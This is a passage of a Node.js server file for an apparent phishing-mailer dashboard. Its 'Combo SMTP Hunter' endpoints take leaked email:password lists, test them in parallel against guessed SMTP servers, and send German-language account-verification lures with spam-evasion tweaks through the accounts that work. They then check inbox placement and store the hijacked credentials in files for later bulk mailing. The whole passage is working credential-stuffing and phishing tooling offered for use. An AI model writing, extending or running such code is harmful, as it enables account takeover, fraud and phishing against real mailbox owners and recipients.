  const result = {
    target: target.email,
    domain: target.domain,
    sent: false,
    placement: 'none',
    folder: 'NOT SENT',
    error: null,
    latency: 0,
    token: null,
    sendStartTime: 0,
    subject: ''
  };

  // Generate unique cryptographic probe token
  const testToken = utils.generateProbeToken();
  const sendStartTime = Date.now();
  result.token = testToken;
  result.sendStartTime = sendStartTime;

  // Load active template and link data
  const tpl = templateData || getActiveTemplateData();
  const targetEmail = target.email;
  const randomId = String(Math.floor(100000 + Math.random() * 900000));

  const context = {
    email: targetEmail,
    user: targetEmail.split('@')[0] || '',
    domain: target.domain || targetEmail.split('@')[1] || '',
    link: tpl.link,
    random_id: randomId,
    randomId: randomId,
    lang: tpl.defaultLang || 'DE'
  };

  const rawSubject = tpl.subject || 'Wichtige Mitteilung zu Ihrem Kundenkonto';
  const subject = utils.replaceTags(rawSubject, context);
  result.subject = subject;

  let rawHtml = tpl.html || '<p>Guten Tag {name},<br>bitte überprüfen Sie Ihre Kontoinformationen: <a href="{link}">{link}</a></p>';
  let html = utils.replaceTags(rawHtml, context);
  html = utils.addAntiSpamVariation(html);
  let text = utils.htmlToPlainText(html);

  // Invisibly embed zero-height probe token into HTML and plain-text
  const probeBundle = utils.embedProbeToken(html, text, testToken);
  html = probeBundle.html;
  text = probeBundle.text;

  const senderName = tpl.senderName || 'Kundenservice';
  const fromAddress = `"${senderName}" <${senderUser}>`;

  try {
    const info = await transporter.sendMail({
      from: fromAddress,
      to: target.email,
      subject: subject,
      html: html,
      text: text,
      headers: {
        'X-Smart-Probe-Token': testToken,
        'X-Delivery-Probe-ID': testToken,
        'X-Mailer-Node': `${host}:${port}`
      }
    });

    if (info && info.messageId) {
      result.sent = true;
      result.latency = Date.now() - sendStartTime;
      result.placement = 'relay';
      result.folder = target.pass ? 'INBOX QUEUED' : 'RELAY 250 OK';
    }
  } catch (sendErr) {
    result.error = sendErr.message ? sendErr.message.split('\n')[0] : 'Send failed';
    result.folder = 'FAILED';
  }

  return result;
}

// --------------------------------------------------------------------------
// API: Combo SMTP Hunter Endpoints
// --------------------------------------------------------------------------

// Start Combo Hunter
app.post('/api/combo-hunter/start', async (req, res) => {
  try {
    if (comboHunterActive) {
      return res.status(400).json({ error: 'Combo SMTP Hunter is already active' });
    }

    const {
      comboList,
      concurrency = 30,
      timeout = 8000,
      ports = [587, 465, 25],
      shuffle = false,
      sendTest = false,
      testRecipient = '',
      testTargets = [],
      testStrategy = 'all' // 'all', 'match_domain', 'round_robin'
    } = req.body;

    if (!comboList || typeof comboList !== 'string') {
      return res.status(400).json({ error: 'Valid combo list is required' });
    }

    // Parse combos matching user@domain:pass or user@domain|pass
    const rawLines = comboList.split('\n').map(l => l.trim()).filter(Boolean);
    const parsedCombos = [];

    for (const line of rawLines) {
      const match = line.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:|](\S+)/);
      if (match) {
        parsedCombos.push({ user: match[1], pass: match[2] });
      }
    }

    if (parsedCombos.length === 0) {
      return res.status(400).json({ error: 'No valid email:password combos found in input' });
    }

    // Parse test targets if enabled
    let parsedTargets = [];
    if (sendTest) {
      if (Array.isArray(testTargets) && testTargets.length > 0) {
        parsedTargets = testTargets;
      } else if (typeof testRecipient === 'string' && testRecipient.trim()) {
        parsedTargets = parseHunterTestTargets(testRecipient);
      }
    }

    // Optional Fisher-Yates shuffle
    if (shuffle) {
      for (let i = parsedCombos.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [parsedCombos[i], parsedCombos[j]] = [parsedCombos[j], parsedCombos[i]];
      }
    }

    comboHunterActive = true;
    comboHunterAbort = false;
    comboHunterResults = [];
    comboHunterStats = {
      total: parsedCombos.length,
      checked: 0,
      valid: 0,
      sent: 0,
      inbox: 0,
      spam: 0,
      relay: 0,
      failed: 0,
      startTime: Date.now(),
      elapsed: '0s',
      cps: 0
    };

    // Return immediately to unblock client UI
    res.json({
      success: true,
      total: parsedCombos.length,
      threads: concurrency,
      ports,
      testTargetsCount: parsedTargets.length,
      testStrategy
    });

    const targetDomainsSummary = parsedTargets.map(t => t.domain).filter((v, i, a) => a.indexOf(v) === i).join(', ') || 'None';
    broadcast({
      type: 'log',
      data: `[Combo Hunter] ⚡ Initiated Smart Matrix Hunter: ${parsedCombos.length} combos | ${concurrency} threads | Ports: ${ports.join(', ')}${sendTest ? ` | Test Domains: [${targetDomainsSummary}]` : ''}`
    });

    // Execute background worker pool
    (async () => {
      let comboIndex = 0;
      let targetCycleIndex = 0;
      const workerCount = Math.min(Math.max(parseInt(concurrency) || 30, 1), 100);
      const probeTimeout = Math.min(Math.max(parseInt(timeout) || 8000, 2000), 30000);

      const statusInterval = setInterval(() => {
        if (!comboHunterActive) {
          clearInterval(statusInterval);
          return;
        }
        const elapsedSec = Math.max((Date.now() - comboHunterStats.startTime) / 1000, 1);
        const mins = Math.floor(elapsedSec / 60);
        const secs = Math.floor(elapsedSec % 60);
        comboHunterStats.elapsed = `${mins > 0 ? mins + 'm ' : ''}${secs}s`;
        comboHunterStats.cps = Math.round((comboHunterStats.checked / elapsedSec) * 10) / 10;

        broadcast({
          type: 'combo-hunter-progress',
          data: comboHunterStats
        });
      }, 500);

      const worker = async () => {
        while (comboIndex < parsedCombos.length && !comboHunterAbort) {
          const currentIndex = comboIndex++;
          const target = parsedCombos[currentIndex];
          if (!target) break;

          const domain = target.user.split('@')[1];
          let foundWorking = false;
          let hitRecord = null;

          if (domain) {
            try {
              const candidateHosts = await getHunterSmartHosts(domain, ports);

              // Ultra-fast parallelized probe in small batches
              const checkResult = await probeHunterCandidates(target.user, target.pass, candidateHosts, probeTimeout);

              if (checkResult && checkResult.valid) {
                foundWorking = true;
                const deliveries = [];
                const imapChecksToQueue = [];

                // If multi-domain test verification is enabled
                if (sendTest && parsedTargets.length > 0) {
                  let targetsToProbe = [];

                  if (testStrategy === 'match_domain') {
                    // Find test mailboxes matching sender's domain or TLD
                    const senderTld = domain.split('.').pop();
                    const matched = parsedTargets.filter(t => t.domain === domain.toLowerCase() || t.domain.endsWith('.' + senderTld));
                    targetsToProbe = matched.length > 0 ? matched : [parsedTargets[targetCycleIndex++ % parsedTargets.length]];
                  } else if (testStrategy === 'round_robin') {
                    targetsToProbe = [parsedTargets[targetCycleIndex++ % parsedTargets.length]];
                  } else {
                    // 'all' strategy: test each configured target domain
                    targetsToProbe = parsedTargets;
                  }

                  for (const testTarget of targetsToProbe) {
                    if (comboHunterAbort) break;
                    const deliveryRes = await verifyHunterDeliveryTarget(
                      checkResult.transporter,
                      target.user,
                      target.pass,
                      checkResult.host,
                      checkResult.port,
                      testTarget
                    );
                    deliveries.push(deliveryRes);

                    if (deliveryRes.sent) {
                      comboHunterStats.sent++;
                      comboHunterStats.relay++;
                      if (testTarget.pass) {
                        imapChecksToQueue.push({
                          deliveryRes,
                          targetEmail: testTarget.email,
                          targetPass: testTarget.pass,
                          testToken: deliveryRes.token,
                          sendStartTime: deliveryRes.sendStartTime,
                          subject: deliveryRes.subject
                        });
                      }
                    }
                  }
                }

                try { checkResult.transporter.close(); } catch (_) { }

                const anyDelivered = deliveries.some(d => d.sent);

                hitRecord = {
                  user: target.user,
                  pass: target.pass,
                  host: checkResult.host,
                  port: checkResult.port,
                  secure: checkResult.secure,
                  latency: checkResult.latency,
                  status: 'valid',
                  sent: anyDelivered,
                  inbox: false,
                  spam: false,
                  deliveries: deliveries,
                  timestamp: new Date().toISOString()
                };

                comboHunterStats.valid++;
                comboHunterResults.unshift(hitRecord);

                // Queue background IMAP inbox checks without blocking worker!
                for (const qItem of imapChecksToQueue) {
                  enqueueHunterImapCheck(
                    hitRecord,
                    qItem.deliveryRes,
                    qItem.targetEmail,
                    qItem.targetPass,
                    qItem.testToken,
                    qItem.sendStartTime,
                    qItem.subject
                  );
                }

                // Append to fresh-valid.txt with verified domains
                try {
                  const verifiedDoms = deliveries
                    .filter(d => d.sent || d.placement === 'inbox' || d.placement === 'relay')
                    .map(d => d.domain ? d.domain.toLowerCase().trim() : '')
                    .filter(Boolean);
                  const domStr = verifiedDoms.length > 0 ? `|${[...new Set(verifiedDoms)].join(',')}` : '';
                  const line = `${checkResult.host}|${checkResult.port}|${target.user}|${target.pass}${domStr}\n`;
                  fs.appendFileSync(path.join(__dirname, 'fresh-valid.txt'), line);
                } catch (_) { }

                broadcast({
                  type: 'combo-hunter-hit',
                  data: hitRecord
                });

                const deliveryLog = deliveries.map(d => `${d.domain}: [${d.folder}]`).join(' | ');
                broadcast({
                  type: 'log',
                  data: `[Combo Hunter] 🎯 HIT: ${target.user}:${target.pass} @ ${checkResult.host}:${checkResult.port} (${checkResult.latency}ms)${deliveryLog ? ` => ${deliveryLog}` : ''}`
                });
              }
            } catch (err) {
              // Graceful error handle for domain evaluation
            }
          }

          if (!foundWorking && !comboHunterAbort) {
            comboHunterStats.failed++;
          }

          comboHunterStats.checked++;
        }
      };

      const pool = [];
      for (let i = 0; i < workerCount; i++) {
        pool.push(worker());
      }

      await Promise.all(pool);
      clearInterval(statusInterval);
      comboHunterActive = false;

      const totalElapsed = Math.max((Date.now() - comboHunterStats.startTime) / 1000, 1);
      const finalCps = Math.round((comboHunterStats.checked / totalElapsed) * 10) / 10;
      comboHunterStats.cps = finalCps;

      broadcast({
        type: 'combo-hunter-done',
        data: {
          stats: comboHunterStats,
          aborted: comboHunterAbort
        }
      });

      broadcast({
        type: 'log',
        data: `[Combo Hunter] 🏁 Completed. Checked: ${comboHunterStats.checked} | Hits: ${comboHunterStats.valid} | Sent: ${comboHunterStats.sent} | Rate: ${finalCps} CPS`
      });
    })().catch(err => {
      console.error('[Combo Hunter Engine Error]', err);
      comboHunterActive = false;
    });
  } catch (error) {
    console.error('[Combo Hunter Error]', error);
    res.status(500).json({ error: error.message });
  }
});

// Abort Combo Hunter
app.post('/api/combo-hunter/stop', (req, res) => {
  if (!comboHunterActive) {
    return res.json({ success: true, message: 'Combo Hunter is not currently running' });
  }
  comboHunterAbort = true;
  comboHunterActive = false;
  broadcast({
    type: 'log',
    data: '[Combo Hunter] 🛑 Operator aborted active verification run.'
  });
  res.json({ success: true, message: 'Abort signal dispatched to worker pool' });
});

// Save verified INBOX hits directly into SMTP Hub (smtp.txt) with verified domains
app.post('/api/combo-hunter/save-to-smtp', (req, res) => {
  try {
    const onlyInbox = req.body.onlyInbox !== false;
    let candidates = req.body.hits && Array.isArray(req.body.hits)
      ? req.body.hits
      : comboHunterResults;

    // Strictly save only nodes verified to have landed in INBOX
    let hitsToSave = onlyInbox
      ? candidates.filter(r => r.inbox === true)
      : candidates.filter(r => r.status === 'valid');

    if (!hitsToSave || hitsToSave.length === 0) {
      return res.status(400).json({ error: 'No verified INBOX hits available to save. Only SMTPs verified in INBOX are added to SMTP Hub.' });
    }

    const smtpPath = path.join(__dirname, 'smtp.txt');
    let existingLines = [];
    if (fs.existsSync(smtpPath)) {
      existingLines = fs.readFileSync(smtpPath, 'utf8')
        .split('\n')
        .map(l => l.trim())
        .filter(Boolean);
    }

    // Map existing entries by "host|port|user|pass" => Set of verified domains
    const hubMap = new Map();
    const hubOrder = [];

    for (const line of existingLines) {
      const parts = line.split('|');
      const [host, port, user, pass] = parts;
      if (!host || !port || !user || !pass) continue;
      const key = `${host.trim()}|${port.trim()}|${user.trim()}|${pass.trim()}`;
      const domainList = parts[4] ? parts[4].split(',').map(d => d.trim().toLowerCase()).filter(Boolean) : [];
      if (!hubMap.has(key)) {
        hubMap.set(key, new Set(domainList));
        hubOrder.push(key);
      } else {
        domainList.forEach(d => hubMap.get(key).add(d));
      }
    }

    let addedCount = 0;
    let updatedCount = 0;

    for (const hit of hitsToSave) {
      const key = `${hit.host}|${hit.port}|${hit.user}|${hit.pass}`;

      // Extract verified inbox recipient domains
      let verifiedDomains = [];
      if (Array.isArray(hit.deliveries) && hit.deliveries.length > 0) {
        verifiedDomains = hit.deliveries
          .filter(d => d.placement === 'inbox')
          .map(d => d.domain ? d.domain.toLowerCase().trim() : '')
          .filter(Boolean);
        if (verifiedDomains.length === 0) {
          verifiedDomains = hit.deliveries
            .filter(d => d.sent || d.placement === 'relay')
            .map(d => d.domain ? d.domain.toLowerCase().trim() : '')
            .filter(Boolean);
        }
      } else if (Array.isArray(hit.domains)) {
        verifiedDomains = hit.domains.map(d => d.toLowerCase().trim()).filter(Boolean);
      }

      if (!hubMap.has(key)) {
        hubMap.set(key, new Set(verifiedDomains));
        hubOrder.push(key);
        addedCount++;
      } else {
        const domainSet = hubMap.get(key);
        let changed = false;
        for (const vd of verifiedDomains) {
          if (!domainSet.has(vd)) {
            domainSet.add(vd);
            changed = true;
          }
        }
        if (changed) updatedCount++;
      }
    }

    const outputLines = hubOrder.map(key => {
      const domains = Array.from(hubMap.get(key));
      return domains.length > 0 ? `${key}|${domains.join(',')}` : key;
    });

    fs.writeFileSync(smtpPath, outputLines.join('\n') + '\n', 'utf8');

    broadcast({
      type: 'log',
      data: `[Combo Hunter] 📥 Saved to SMTP Hub: ${addedCount} added, ${updatedCount} updated with target domains. Total in Hub: ${outputLines.length}`
    });

    res.json({
      success: true,
      addedCount,
      updatedCount,
      totalInHub: outputLines.length
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get Hunter Status
app.get('/api/combo-hunter/status', (req, res) => {
  res.json({
    active: comboHunterActive,
    stats: comboHunterStats,
    results: comboHunterResults.slice(0, 100)
  });
});

// Serve the main dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((error, req, res, next) => {
  if (error && (error.type === 'entity.too.large' || error.status === 413)) {
    const sizeKb = Math.round((error.length || error.expected || 0) / 1024);
    const limitKb = Math.round((error.limit || 0) / 1024);
    console.warn(`[HTTP 413] Request payload too large: ${sizeKb} KB (Limit: ${limitKb} KB)`);
    return res.status(413).json({
      error: 'Payload Too Large',
      message: `The submitted payload (${sizeKb} KB) exceeds the server limit (${limitKb} KB). Please split the list or file into smaller chunks.`
    });
  }
  console.error('[Server Error]', error);
  res.status(500).json({ error: error.message || 'Internal server error' });
});

// Create necessary directories
const dirs = ['uploads', 'public'];
dirs.forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`AI Mailer Web Server running on port ${PORT}`);
  console.log(`Dashboard: http://localhost:${PORT}`);
});

module.exports = { app, server, wss };